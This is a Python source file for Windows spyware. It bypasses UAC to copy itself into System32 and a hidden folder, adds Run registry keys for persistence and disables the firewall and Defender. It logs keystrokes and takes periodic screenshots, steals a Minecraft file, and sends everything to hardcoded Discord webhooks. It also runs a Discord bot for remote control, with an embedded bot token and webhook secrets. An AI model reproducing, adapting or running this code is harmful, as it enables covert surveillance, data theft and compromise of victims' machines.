from core import keylogger, sender, turn_off_security
from PIL import ImageGrab
from discord_bot import bot
from winpwnage.functions.uac.uacMethod1 import uacMethod1
import time, os, sys, shutil, threading

if os.path.exists("c:\\windows\\system32\\systemcheck.exe"):
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del c:\windows\system32\systemcheck.exe'])
if os.path.exists("c:\\SysCheck\\SysCheck.exe"):
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del C:\\SysCheck\\SysCheck.exe'])

if getattr(sys, 'frozen', False):
	file_path = sys.executable
	type_of = "exe"
elif __file__:
	file_path = __file__
	type_of = "py"

if os.path.dirname(file_path) != 'C:\\Windows\\System32':
	if True:
		uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f"copy {file_path} c:\\windows\\system32\\systemcheck.exe"])
		uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v systemcheck /t REG_SZ /d c:\\windows\\system32\\systemcheck.exe'])

if os.path.dirname(file_path) != "C:\\SysCheck":
	try:
		os.mkdir("C:\\SysCheck")
	except:
		pass
	os.system("attrib +s +h /d C:\\SysCheck")
	file_startup_path = f"C:\\SysCheck\\SysCheck.{'py' if type_of == 'py' else 'exe'}"
	shutil.copy(file_path, file_startup_path)
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v syscheck /t REG_SZ /d {file_startup_path}'])

Security = turn_off_security.TurnOffSecurity()
keylogger = keylogger.Keylogger()
sender = sender.Sender()

Security.FireWall()
Security.Defender()
keylogger.start()
sender.webhook_log_url = 'https://discord.com/api/webhooks/1128326661000155248/nDG6sPvn8RitbJwHtDpm0Njy9xkOG_ajJBJfX-Hatd0RYuVymvpdD3IAgReuqj4BGam6'
sender.webhook_info_url = 'https://discord.com/api/webhooks/1128643994163871867/B9HL54arPjlrVqR2vAuWCnICe_ngD1k8hMjCxkuIlJhxkZ-cr24gZlgZz5oYZ8sczREJ'
sender.send_info()

# last_window = ''
# last_window = keylogger.log_window_title if last_window == '' else ''
global time_count, time_delay
time_count = time_delay = 60

def StealHotBar():
	hotbar = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.minecraft\\hotbar.nbt"
	try:
		sender.send_file(hotbar, '**HotBar Stealer**')
	except:
		sender.send("Not Found HotBar", "HotBar Stealer")
StealHotBar()

def Send():
	# last_window = keylogger.log_window_title
	snapshot = ImageGrab.grab()
	image_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\sc.jpg"
	snapshot.save(image_path)
	# sender.send(keylogger.log_text, keylogger.log_window_title, image_path)
	sender.send(keylogger.log_text, image_path = image_path)
	keylogger.log_text = ''

def LogSend():
	global time_count, time_delay
	while True:
		Send()
		time.sleep(time_delay)
		# Send()
		# time.sleep(time_delay)
		# if keylogger.log_window_title == last_window:
		# 	time_count -= 1
		# 	time.sleep(1)
		# 	if time_count == 0 and keylogger.log_text != '':
		# 		Send()
		# 		time_count = time_delay
		# 	elif time_count == 0 and keylogger.log_text == '':
		# 		time_count = time_delay
		# elif keylogger.log_text != '':
		# 	Send()
		# 	time_count = time_delay

def BotControl():
	bot.client.run('MTEyODk0MTcwMzAzNDgzNDk2NA.G8b_eP.UBMC8F2ETPzOMEof3XRtc_EdGhGoZv0hZrW-3c')

log_send = threading.Thread(target = LogSend, daemon=True)
bot_th = threading.Thread(target = BotControl)
log_send.start()
bot_th.start()
log_send.join()
bot_th.join()
